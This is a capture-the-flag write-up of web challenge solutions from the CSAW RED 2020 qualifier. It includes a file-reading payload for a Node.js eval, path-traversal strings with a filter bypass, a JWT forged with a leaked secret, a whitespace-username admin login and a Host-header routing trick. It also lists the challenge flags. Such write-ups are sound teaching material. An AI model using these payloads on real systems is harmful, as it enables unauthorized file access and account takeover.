---
title: CSAW RED 2020 Qualifier (web)
date: 2020-09-29
slug: /writeups/csaw-red-2020-qual-web
excerpt: Solutions for web challenges from the CSAW RED 2020 Qualification Round.
---

Solutions for web challenges from the CSAW RED 2020 Qualification Round.

Some of the scripts in this document have been clipped for the sake of brevity.

# web - Lens of Truth
> Use the tools at your disposal to look a bit closer...
>
> http://web.red.csaw.io:5009/

## Solution
View source.

## Flag
```
flag{s33k_th3_truth}
```

# web - robots
> Only robots can find my treasure
>
> http://web.red.csaw.io:5000

## Solution
[robots.txt](http://web.red.csaw.io:5000/robots.txt) has an [interesting path](http://web.red.csaw.io:5000/super-duper-extra-secret-very-interesting).

## Flag
```
flag{welcome_to_website_hacking}
```

# web - traverse 1
> Go now, traverse. The flag is at `/flag.txt`.
>
> http://web.red.csaw.io:5001

## Files
- index.js

## Solution
Put `/flag.txt` in the box.

## Flag
```
flag{wow_you_got_it!_lets_see_if_you_can_get_the_next_one...}
```

# web - calculator app
> I just made my first website! Its just a simple calculator. I dont really know what I'm doing, can you help me test it?
>
> The flag is at `/flag.txt`.
>
> http://web.red.csaw.io:5005

## Files
- index.js

## Solution
Our input is `eval()`ed. Submit

```js
require('fs').readFileSync('/flag.txt').toString()
```

to get the flag.

## Flag
```
flag{rce_is_a_fun_thing}
```

# web - traverse 2
> Go now, traverse again. The flag is at `/flag.txt`.
>
> http://web.red.csaw.io:5004

## Files
- index.js

## Solution
We can't start with `/`, so we just submit

```
../../../../../../../../../flag.txt
```

## Flag
```
flag{that_one_was_a_bit_harder_but_there_is_one_more...}
```

# web - traverse 3
> Go now, traverse again again. The flag is at `/flag.txt`.
>
> http://web.red.csaw.io:5003

## Files
- index.js

## Solution
Now `../` is filtered out, but in a linear fashion. Submit

```
..././..././..././..././..././..././..././flag.txt
```

to get the flag.

## Flag
```
flag{I_must_yield_you_have_proven_yourself_a_dedicated_hacker}
```

# web - jwt
> you'll never get access to the flag!
>
> http://web.red.csaw.io:5013

## Files
- app&#46;py

## Solution
We can request access to any file that isn't flag.txt. However, note that the JWT secret is stored at `static/secret.txt`. After requesting access to `secret.txt`, we can read the secret key, which is `super_secret_k3y`. Now we just need to sign our own JWT to give us access to `flag.txt`.

```json
header
{
  "alg": "HS256",
  "typ": "JWT"
}
payload
{
  "filename": "flag.txt"
}
```
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaWxlbmFtZSI6ImZsYWcudHh0In0.HbdszJEzWms5E81eENfvaIore8viKKT6U-B2gB59g3o
```

## Flag
```
flag{n0_fr33_acc3es}
```

# web - whitespace
> I think I handled the authentication correctly here... (this challenge resets its database every 60 seconds)
>
> http://web.red.csaw.io:5002

## Files
- app&#46;py

## Solution
The app sets our session username after stripping whitespace.

```python
session['username'] = username.strip()
```

Thus, we make a new account with username `admin    ` and login to get the flag.

## Flag
```
flag{gotta_make_sure_you_handle_the_whitespace!}
```

# web - Traefik
> hint: Try to learn how traefik routes requests. Reddit is NOT a part of the challenge. Do not attack reddit.
>
> http://web.red.csaw.io:5006

## Files
- docker-compose.yml

## Solution
There is a `flag` container exposed by Traefik.

```yaml
  flag:
    container_name: flag
    build: .
    command: gunicorn -b "0.0.0.0:80" -w 1 flag:app
    labels:
      - "traefik.http.routers.flag-http.rule=Host(`flag`)"
      - "traefik.http.routers.flag-http.entrypoints=http"
```

Traefik routes with the `Host` header, so we can get the flag with curl.

```
$ curl http://web.red.csaw.io:5006 -H "Host: flag"
flag{81rD5_@RnT_r3@1!!!!!}
```

## Flag
```
flag{81rD5_@RnT_r3@1!!!!!}
```
